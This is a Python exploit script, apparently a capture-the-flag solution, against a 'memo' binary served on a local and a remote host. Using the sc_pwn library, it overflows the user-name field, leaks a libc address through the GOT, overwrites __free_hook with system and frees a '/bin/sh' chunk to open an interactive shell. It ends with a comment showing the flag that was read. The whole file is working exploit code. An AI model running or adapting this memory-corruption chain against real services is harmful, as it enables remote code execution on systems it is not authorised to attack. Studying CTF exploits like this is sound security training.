#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.92.128','port':8080}, \
                        remote  = {'host':'54.202.7.144','port':8888})
env.set_item('libc',    local   = 'D:\\CTF\\files\\libc-2.19.so_amd64_local', \
                        remote  = 'memo_libc.so.6')
env.select()

libc = ELF(env.libc)
binf = ELF('memo')
addr_got_main       = binf.got('__libc_start_main')
addr_bss_messages   = 0x00602a70

str_sh  = '/bin/sh\x00'

#==========
def attack(cmn):
    memo = Memo(cmn)
    
    cmn.read_until('name: ')
    cmn.send(('\x00'*0x18)+pack_64(addr_bss_messages))
    cmn.read_until('(y/n) ')
    cmn.sendln('y')
    cmn.read_until('Password: ')
    cmn.sendln('PASS')

    memo.leave(0, 10, 'aaaa')
    addr_heap_base = unpack_64(mold_64(memo.edit('bbbb'))) - 0x10

    memo.leave(-7)
    memo.edit(pack_64(addr_got_main))
    
    addr_libc_main  = unpack_64(mold_64(memo.view(0)))
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_system    = libc.function('system')
    addr_libc_free_hook = libc.symbol('__free_hook')

    memo.chpass('PASS', ('\x00'*0x18)+pack_64(addr_libc_free_hook), 'PASS'+pack_32(0x30))
    memo.leave(-7)
    memo.edit(pack_64(addr_libc_system))

    memo.leave(1, len(str_sh), str_sh)
    memo.delete(1)

class Memo:
    def __init__(self, cmn):
        self.read_until = cmn.read_until
        self.read_all   = cmn.read_all
        self.sendln     = cmn.sendln
        self.send       = cmn.send

    def leave(self, index, length=0, msg=None):
        self.read_until('>> ')
        self.sendln('1')
        self.read_until('Index: ')
        self.sendln(str(index))
        if 'Length' in self.read_until(['Length: ', 'index']):
            self.sendln(str(length))
            self.read_until('Message: ')
            self.sendln(msg)

    def edit(self, msg=None):
        self.read_until('>> ')
        self.sendln('2')
        self.read_until('message: ')
        if msg:
            self.send(msg)
        self.read_until()
        return self.read_until(contain=False)

    def view(self, index):
        self.read_until('>> ')
        self.sendln('3')
        self.read_until('Index: ')
        self.sendln(str(index))
        self.read_until('Message: ')
        return self.read_until(contain=False)

    def delete(self, index):
        self.read_until('>> ')
        self.sendln('4')
        self.read_until('Index: ')
        self.sendln(str(index))
        
    def chpass(self, now_pass, new_name, new_pass):
        self.read_until('>> ')
        self.sendln('5')
        self.read_until('Password: ')
        self.sendln(now_pass)
        self.read_until('New user name: ')
        self.send(new_name)
        self.read_until('New password: ')
        self.sendln(new_pass)
    
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    #sh = Shell(cmn)
    #sh.select()
    #del(sh)
    Interact(cmn).worker(False)
    
    del(cmn)
    
#==========

'''
cat /home/memo/flag
bkp{you are a talented and ambitious hacker}
'''
